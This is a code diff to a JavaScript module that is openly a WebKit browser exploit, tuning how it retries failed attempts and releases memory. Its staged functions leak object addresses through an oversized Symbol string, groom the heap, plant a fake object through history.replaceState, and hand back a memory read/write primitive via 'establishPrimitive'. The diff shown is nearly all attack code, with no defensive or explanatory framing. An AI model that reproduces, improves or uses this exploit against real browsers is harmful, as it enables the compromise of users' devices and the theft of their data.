@@ -25,8 +25,6 @@ let keepIndex = 0
 let keepAlive = null
 let onEvent = null
 let settleResolve = null
-let settleReject = null
-const MAX_ATTEMPTS = 20
 let memoryView = null
 let memoryMirror = null
 let targetView = null
@@ -168,23 +166,14 @@ function releaseAttempt() {
   } catch {}
 }
 
-function retry(reason, safeToRelease, overrideDelay) {
+function retry(reason, safeToRelease) {
   const nextAttempt = attemptNumber + 1;
   emit("Retry", `${reason} attempt ${nextAttempt}`);
   if (safeToRelease) releaseAttempt();
-  if (nextAttempt > MAX_ATTEMPTS) {
-    const reject = settleReject;
-    settleResolve = null;
-    settleReject = null;
-    if (reject) reject(new Error(`WebKit exploit failed after ${MAX_ATTEMPTS} attempts`));
-    return;
-  }
-  const delay = overrideDelay !== undefined ? overrideDelay
-    : (safeToRelease ? 2000 : 50);
   setTimeout(() => {
     attemptNumber = nextAttempt;
     startAttempt();
-  }, delay);
+  }, safeToRelease ? 750 : 50);
 }
 
 function finishEarlySafeAttempt(reason, detail = "") {
@@ -207,14 +196,13 @@ function startAttempt() {
     storeHistoryGraph();
     for (let i = 0; i < 8; ++i)
       memoryView[CANARY_OFFSET + i] = identityMagic[i];
+    prepareAddressLeak();
   } catch (error) {
     finishEarlySafeAttempt(
       "setup failed",
       `${error?.name}: ${String(error?.message).slice(0, 80)}`,
     );
-    return;
   }
-  setTimeout(prepareAddressLeak, 200);
 }
 
 // Address-leak helper
@@ -308,7 +296,6 @@ function storeHistoryGraph() {
   outerGraph[CONTROL_INDEX] = -64000;
  
   history.replaceState(outerGraph, "");
-  outerGraph = null;
 }
 
 // Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
@@ -653,20 +640,14 @@ function finishAddressLeak() {
   const fakeAddress = hostAddress + 0x10;
   if (!plausibleCell(fakeAddress))
     return finishEarlySafeAttempt("Invalid fake object address", hex(hostAddress));
-  capturedString = null;
-  getterCarrier = null;
-  preparedSymbolObject = null;
-  capturedWords = null;
-  setTimeout(() => groomHeap(fakeAddress, holderAddress), 100);
+  groomHeap(fakeAddress, holderAddress);
 }
 
 // Stage 5: retry placement misses or publish the validated memory window.
 function finishAttempt(outcome, holderAddress, fakeAddress) {
   if (outcome.status === "error") {
     emit("Failed", String(outcome.error?.message || outcome.error));
-    const msg = String(outcome.error?.message || outcome.error).toLowerCase();
-    const isOom = /deseriali[sz]|out of memory/.test(msg);
-    return retry("Heap placement failed", outcome.safe || isOom, isOom ? 5000 : undefined);
+    return retry("Heap placement failed", outcome.safe);
   }
 
   if (outcome.status === "unchanged")
@@ -687,7 +668,6 @@ function finishAttempt(outcome, holderAddress, fakeAddress) {
 
   const resolve = settleResolve;
   settleResolve = null;
-  settleReject = null;
   if (resolve !== null) resolve(createMemoryWindow(holderAddress));
 
   emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
@@ -743,9 +723,8 @@ export function establishPrimitive(eventHandler = null) {
 
   attemptNumber = 1;
 
-  return new Promise((resolve, reject) => {
+  return new Promise((resolve) => {
     settleResolve = resolve;
-    settleReject = reject;
     startAttempt();
   });
 }
